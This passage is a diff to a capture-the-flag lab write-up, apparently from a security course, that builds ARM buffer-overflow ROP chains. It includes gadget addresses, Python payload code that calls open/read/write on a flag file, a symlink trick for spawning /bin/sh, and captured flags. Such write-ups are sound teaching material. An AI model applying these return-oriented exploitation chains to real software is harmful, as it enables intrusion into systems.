@@ -22,6 +22,9 @@ from pwn import *
     - [1. setregid(1020, 1020)](#1-setregid1020-1020)
     - [2. execve("/bin/sh", 0, 0)](#2-execvebinsh-0-0)
   - [(bonus) 9-rop1-arm](#bonus-9-rop1-arm)
+    - [1. open("flag", 0, 0)](#1-openflag-0-0)
+    - [2. read(3, global_variable_addr, size)](#2-read3-global_variable_addr-size)
+    - [3. write(1, global_variable_addr, size)](#3-write1-global_variable_addr-size)
 
 ## 1-shellcode-arm
 
@@ -512,6 +515,8 @@ How do we find the starting address of the argument?
 
 Just like `6-stack-ovfl-use-envp-arm`, first crash program with an argument and find the address using `gdb`. It is on the stack, so use `x/1000s $sp` in gdb to get it.
 
+You've got the flag.
+
 ```bash
 TXK220008@ctf-vm3:~/unit2/7-stack-ovfl-no-envp-arm $ ./solve7.py
 [+] Starting local process './7-stack-ovfl-no-envp-arm': pid 789253
@@ -656,7 +661,11 @@ From them, these instructions can be used to set `r0`, `r1`, and `r2` for argume
 0x00010638: mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
 ```
 
-We cannot use a string `"/bin/sh"` to call it, so use the symbolic link. `0x106EE` is `1` and us eit.
+We cannot use a string `"/bin/sh"` to call it, so use the symbolic link. `0x106EE` is `1` and used for the symbolic link.
+
+```bash
+ln -s /bin/sh 1
+```
 
 Suppose these are constants that will be used in my solution.
 
@@ -717,6 +726,10 @@ payload += struct.pack("I", execve)  # r3
 payload += struct.pack("I", mov)  # pc
 ```
 
+- [x] send addresses and arguments by buffer overflow
+  - [x] the first package contains `setregid`, `1020`, and `1020`.
+  - [x] the second package contains `execve`, `"/bin/sh"`, `0`, `0`.
+
 You've got the flag.
 
 ```bash
@@ -727,8 +740,6 @@ Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 $ cat flag
 cs6332{pop_pop_pop_bx_pop_corn}
 ```
-
-- [x] get the addresses of syscalls
 
 ## (bonus) 9-rop1-arm
 
@@ -743,3 +754,130 @@ Call:
     write(1, global_variable_addr, size);
 ```
 ````
+
+First, look for functions in the program. We can easily find them by do `odjdump -d 9-rop1-arm`.
+
+```armasm
+000103cc <open@plt>:
+   103cc:	e28fc600 	add	ip, pc, #0, 12
+   103d0:	e28cca10 	add	ip, ip, #16, 20	; 0x10000
+   103d4:	e5bcfc48 	ldr	pc, [ip, #3144]!	; 0xc48
+000103a8 <read@plt>:
+   103a8:	e28fc600 	add	ip, pc, #0, 12
+   103ac:	e28cca10 	add	ip, ip, #16, 20	; 0x10000
+   103b0:	e5bcfc60 	ldr	pc, [ip, #3168]!	; 0xc60
+000103f0 <write@plt>:
+   103f0:	e28fc600 	add	ip, pc, #0, 12
+   103f4:	e28cca10 	add	ip, ip, #16, 20	; 0x10000
+   103f8:	e5bcfc30 	ldr	pc, [ip, #3120]!	; 0xc30
+```
+
+Their addresses are like in the table below.
+
+| syscall | address    |
+| ------- | ---------- |
+| `open`  | `000103cc` |
+| `read`  | `000103a8` |
+| `write` | `000103f0` |
+
+Next, look for rop gadgets, which pop stack values into registers and move the register values into other registers.
+
+Open `ropper`, and execute `file 9-rop1-arm`, `search pop`, and `search mov` in the `ropper` interactive program. We get the addresses useful for our purpose.
+
+```bash
+0x00010384: pop {r3, pc};
+0x00010628: pop {r4, r5, r6, r7, r8, sb, sl, pc};
+0x00010610: mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
+```
+
+From experiment, we can learn that we need `132` byte to trigger buffer overflow and access the return address.
+
+```python
+offset = 132
+payload = b""
+payload += p8(0x61) * offset
+```
+
+Just like we did in problem8, we can do ROP. These are the constants for ROP.
+
+```python
+# 0x00010384: pop {r3, pc};
+rop3 = 0x00010384
+# 0x00010628: pop {r4, r5, r6, r7, r8, sb, sl, pc};
+rop4 = 0x00010628
+# 0x00010610: mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
+mov = 0x00010610
+# 000103cc: open
+open_addr = 0x000103CC
+flag = 0xFFFF0F76
+# 000103a8: read
+read_addr = 0x000103A8
+global_variable_addr = 0x021100
+size = 0x100
+# 000103f0: write
+write_addr = 0x000103F0
+offset = 132
+JUNK = 0x4B4E554A
+```
+
+### 1. open("flag", 0, 0)
+
+Fist, call `pop {r3, pc}` and fill its `r3` and `pc`.
+Next, call `0x00010628: pop {r4, r5, r6, r7, r8, sb, sl, pc};` and fill in their arguments.
+Finally, call `0x00010610: mov r2, sb; mov r1, r8; mov r0, r7; blx r3;` to move values of registers and call `open` function.
+
+```python
+payload += struct.pack("I", rop3)
+payload += struct.pack("I", open_addr)  # r3
+payload += struct.pack("I", rop4)  # pc of rop3
+payload += struct.pack("I", JUNK)  # r4
+payload += struct.pack("I", JUNK)  # r5
+payload += struct.pack("I", JUNK)  # r6
+payload += struct.pack("I", flag)  # r7 -> r0
+payload += struct.pack("I", 0)  # r8 -> r1
+payload += struct.pack("I", 0)  # sb -> r2
+payload += struct.pack("I", JUNK)  # sl
+payload += struct.pack("I", mov)  # pc of rop4
+```
+
+We're going to do the same thing for `read` and `write`, so omit their explanations.
+
+### 2. read(3, global_variable_addr, size)
+
+```python
+payload += struct.pack("I", JUNK) # r4
+payload += struct.pack("I", JUNK) # r5
+payload += struct.pack("I", JUNK) # r6
+payload += struct.pack("I", 3) # r7 -> r0
+payload += struct.pack("I", global_variable_addr) # r8 -> r1
+payload += struct.pack("I", size) # sb -> r2
+payload += struct.pack("I", JUNK) # sl
+payload += struct.pack("I", rop3) # pc of rop4
+payload += struct.pack("I", read_addr) # r3
+payload += struct.pack("I", mov) # pc of rop3
+```
+
+### 3. write(1, global_variable_addr, size)
+
+```python
+payload += struct.pack("I", JUNK) # r4
+payload += struct.pack("I", JUNK) # r5
+payload += struct.pack("I", JUNK) # r6
+payload += struct.pack("I", 1) # r7 -> r0
+payload += struct.pack("I", global_variable_addr) # r8 -> r1
+payload += struct.pack("I", size) # sb -> r2
+payload += struct.pack("I", JUNK) # sl
+payload += struct.pack("I", rop3) # pc of rop4
+payload += struct.pack("I", write_addr) # r3
+payload += struct.pack("I", mov) # pc of rop3
+```
+
+You've got the flag.
+
+```bash
+TXK220008@ctf-vm2:~/unit2/9-rop1-arm $ ./solve9.py
+[+] Starting local process './9-rop1-arm': pid 421843
+[*] Switching to interactive mode
+Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x84\x03!
+ca6332{N0W_Y0U_C4N_0p3n_r3aD_wR1t3}
+```
